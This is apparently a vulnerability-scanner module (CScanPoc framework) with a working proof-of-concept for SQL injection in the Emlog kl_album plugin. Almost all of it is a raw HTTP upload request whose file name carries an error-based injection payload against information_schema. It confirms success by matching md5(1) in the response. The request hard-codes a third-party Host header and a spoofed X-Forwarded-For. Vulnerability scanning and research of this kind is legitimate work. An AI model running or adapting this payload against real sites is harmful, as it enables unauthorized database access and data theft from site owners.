# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Emlog_0009'  # 平台漏洞编号，留空
    name = 'Emlog相册插件SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-11-12'  # 漏洞公布时间
    desc = '''
        Emlog相册插件SQL注入漏洞
    '''  # 漏洞描述
    ref = 'https://www.leavesongs.com/PENETRATION/emlog-important-plugin-getshell.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Emlog'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '45e3c8a9-3201-42e4-8f86-16707480d132'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = 'content/plugins/kl_album/kl_album_ajax_do.php'
            target = arg + payload
            raw = """POST /content/plugins/kl_album/kl_album_ajax_do.php HTTP/1.1
Host: www.zhangjiexiong.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Forwarded-For: 8.8.8.8
Connection: Keep-Alive
Content-Type: multipart/form-data; boundary=---------------------------19397961610256
Content-Length: 514

-----------------------------19397961610256
Content-Disposition: form-data; name="Filedata"; filename="info',(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,md5(1)))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a),'','','0','0','', 0)#.jpg"
Content-Type: image/jpeg

1
-----------------------------19397961610256
Content-Disposition: form-data; name="album"

111111
-----------------------------19397961610256--"""
            code, head, res, errcode, _ = hh.http(target, raw=raw)
            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
